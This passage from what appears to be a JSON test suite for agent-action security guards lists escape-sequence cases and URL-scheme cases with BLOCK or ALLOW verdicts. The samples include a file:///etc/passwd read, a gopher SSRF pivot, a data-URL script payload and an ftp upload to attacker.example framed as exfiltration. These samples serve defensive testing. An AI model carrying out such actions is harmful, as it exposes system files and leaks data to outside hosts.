        "event": {
          "action": "emit_text",
          "args": {
            "text": "This text should appear in red"
          }
        }
      },
      {
        "name": "the word ESC with no following '['",
        "expect": "ALLOW",
        "event": {
          "action": "emit_text",
          "args": {
            "text": "Press ESC to cancel"
          }
        }
      },
      {
        "name": "real ESC byte not followed by '['",
        "expect": "ALLOW",
        "event": {
          "action": "emit_text",
          "args": {
            "text": "\u001bA no bracket"
          }
        }
      }
    ]
  },
  {
    "detector": "url_scheme_guard",
    "factory": "url_scheme_guard",
    "cases": [
      {
        "name": "file scheme reads local disk",
        "expect": "BLOCK",
        "event": {
          "action": "fetch",
          "args": {
            "url": "file:///etc/passwd"
          }
        }
      },
      {
        "name": "gopher scheme pivots to an internal port",
        "expect": "BLOCK",
        "event": {
          "action": "request",
          "args": {
            "url": "gopher://internal-service:70/_SSRF"
          }
        }
      },
      {
        "name": "data scheme carries an inline payload",
        "expect": "BLOCK",
        "event": {
          "action": "http_get",
          "args": {
            "url": "data:text/html,<script>alert(1)</script>"
          }
        }
      },
      {
        "name": "ftp scheme exfiltrates to a third party",
        "expect": "BLOCK",
        "event": {
          "action": "upload",
          "args": {
            "url": "ftp://attacker.example/dropzone"
          }
        }
      },
      {
        "name": "missing scheme entirely",
        "expect": "BLOCK",
        "event": {
          "action": "fetch",
          "args": {
            "url": "internal-service/admin"
          }
        }
      },
      {
        "name": "https destination on an egress action",
        "expect": "ALLOW",
        "event": {
          "action": "http_post",
          "args": {
            "url": "https://api.acme.com/v1/users"
          }
        }
      },
      {
        "name": "plain http is allowed too",
        "expect": "ALLOW",
        "event": {
          "action": "http_get",
          "args": {
            "url": "http://internal.example.com/healthz"
          }
        }
      },
      {
        "name": "non-egress action is out of scope regardless of scheme",
        "expect": "ALLOW",
        "event": {
          "action": "read_file",
          "args": {
            "url": "file:///etc/passwd"
          }
        }
      },
      {
        "name": "query string on an allowed scheme is not this guard's job",
        "expect": "ALLOW",
        "event": {
          "action": "fetch",
          "args": {
            "url": "https://api.acme.com/search?next=https://evil.example"
          }
        }
      }
    ]
  },
  {
    "detector": "mass_assignment_guard",
